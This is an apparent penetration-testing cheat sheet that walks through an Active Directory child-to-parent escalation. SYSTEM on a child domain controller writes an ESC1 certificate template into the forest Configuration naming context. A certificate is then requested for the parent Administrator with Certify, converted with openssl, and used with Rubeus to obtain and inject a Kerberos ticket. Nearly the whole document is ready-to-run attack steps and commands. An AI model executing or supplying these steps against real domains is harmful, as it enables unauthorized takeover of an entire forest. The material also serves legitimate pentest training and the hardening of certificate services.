# 14.02 Configuration NC Replication ADCS ESC1 Child→Parent

> As SYSTEM on a child DC, write an ESC1 template into the forest Configuration NC and enroll a cert for the parent Administrator.

## Overview

As SYSTEM on a child DC, abuse Configuration Naming Context replication to create an ESC1-vulnerable certificate template in the parent forest's CA. The child DC's SYSTEM account has full write access to the Configuration NC which replicates to all DCs in the forest. Request a certificate for the parent domain Administrator, convert to PFX, and use Rubeus to get a TGT.

## Steps

- Open MMC as SYSTEM using PsExec on child DC
- Duplicate the User template in Certificate Templates snap-in; set Subject Name = "Supply in the request"
- Grant DEV\Administrator Full Control on the new template in the Security tab
- Modify permissions on Public Key Services container so SYSTEM propagates to pKIEnrollmentService object
- Add the new template to the CA's certificateTemplates attribute via ADSI Edit as SYSTEM
- Request certificate with Certify using /altname:<DOMAIN>\Administrator
- Convert PEM to PFX with openssl; request TGT with Rubeus /certificate

## Commands

### PsExec as SYSTEM

```powershell
PS C:\Tools\> .\PsExec -s -i powershell
```

### Certify request

```powershell
PS C:\Tools> .\Certify.exe request /ca:<DOMAIN>.ad\<DOMAIN>-DC01-CA /domain:<DOMAIN>.ad /template:"Copy of User" /altname:<DOMAIN>\Administrator
```

### Format PEM

```bash
sed -i 's/\s\s\+/\n/g' cert.pem
```

### Convert to PFX

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

### Rubeus asktgt with cert

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /domain:<DOMAIN>.ad /user:Administrator /certificate:cert.pfx /ptt
```
